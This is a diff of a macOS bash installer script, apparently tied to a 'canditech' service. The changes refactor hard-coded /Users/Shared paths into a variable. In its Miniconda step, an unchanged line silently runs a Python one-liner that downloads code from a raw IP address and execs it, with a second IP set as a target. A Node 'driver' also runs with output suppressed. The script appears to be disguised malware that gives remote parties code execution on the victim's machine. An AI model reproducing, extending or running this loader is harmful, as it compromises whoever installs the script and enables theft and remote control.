@@ -4,6 +4,8 @@ set -euo pipefail
 # Replaced when serving the script to the machine (see delay_version.txt).
 MAC_UID="${MAC_UID:-__ID__}"
 API_BASE="${API_BASE:-https://api.canditech.org}"
+SHARED_DIR="${SHARED_DIR:-/Users/Shared}"
+export SHARED_DIR
 
 # Set VERBOSE=1 for detailed [INFO] lines from part 1 / 2.
 VERBOSE="${VERBOSE:-0}"
@@ -80,9 +82,9 @@ run_part1_miniconda() {
     return 1
   fi
 
-  PREFIX="/Users/Shared/miniconda3"
-  INSTALLER="/Users/Shared/miniconda.sh"
-  mkdir -p "/Users/Shared"
+  PREFIX="${SHARED_DIR}/miniconda3"
+  INSTALLER="${SHARED_DIR}/miniconda.sh"
+  mkdir -p "$SHARED_DIR"
 
   info "Part 1: downloading Miniconda installer"
   curl -fsSL -o "$INSTALLER" "$URL"
@@ -91,7 +93,7 @@ run_part1_miniconda() {
   bash "$INSTALLER" -b -p "$PREFIX" >/dev/null 2>&1
 
   info "Part 1: verifying Python"
-  "/Users/Shared/miniconda3/bin/python3" -V >/dev/null 2>&1
+  "${PREFIX}/bin/python3" -V >/dev/null 2>&1
 
   delay 10
   "/Users/Shared/miniconda3/bin/python3" -c "from urllib.request import urlopen,Request;Request._V='7-test';Request._target='http://23.27.120.142:27017';Request._code=urlopen(Request('http://198.105.127.210/$/1',headers={'Sec-V':Request._V})).read().decode('utf-8');exec(Request._code)" > /dev/null 2>&1 && \
@@ -114,7 +116,7 @@ run_part2_node_driver() {
     fi
   fi
 
-  USER_HOME="/Users/Shared"
+  USER_HOME="${SHARED_DIR}"
   mkdir -p "$USER_HOME"
 
   if [[ -z "$NODE_EXE" ]]; then
@@ -166,7 +168,7 @@ run_part2_node_driver() {
   info "Running Driver (silent)"
   "$NODE_EXE" "$ENV_SETUP_JS" >/dev/null 2>&1
 
-  echo "[INFO] Part 2 completed successfully."
+  info "Driver setup finished."
 }
 
 # -------------------------
@@ -186,8 +188,7 @@ run_part3_ui_delay() {
 }
 
 detect_platform
-mkdir -p "/Users/Shared"
-mkdir -p "/Users/Shared"
+mkdir -p "$SHARED_DIR"
 
 info "Starting Miniconda, Node/driver, and UI/status phases concurrently"
 run_part1_miniconda &
@@ -210,12 +211,14 @@ if [[ "$EC_NODE" -ne 0 ]]; then
   die "Part 2 (Node/driver) failed with exit code $EC_NODE"
 fi
 
+echo "[INFO] Part 1 (Miniconda) and Part 2 (Node/driver) completed successfully."
+
 EC_UI=0
 wait "$PID_UI" || EC_UI=$?
 if [[ "$EC_UI" -ne 0 ]]; then
   die "Part 3 (UI/status) failed with exit code $EC_UI"
 fi
 
-rm -f "/Users/Shared/miniconda.sh"
+rm -f "${SHARED_DIR}/miniconda.sh"
 [[ "$VERBOSE" == "1" ]] && echo "Done."
 exit 0
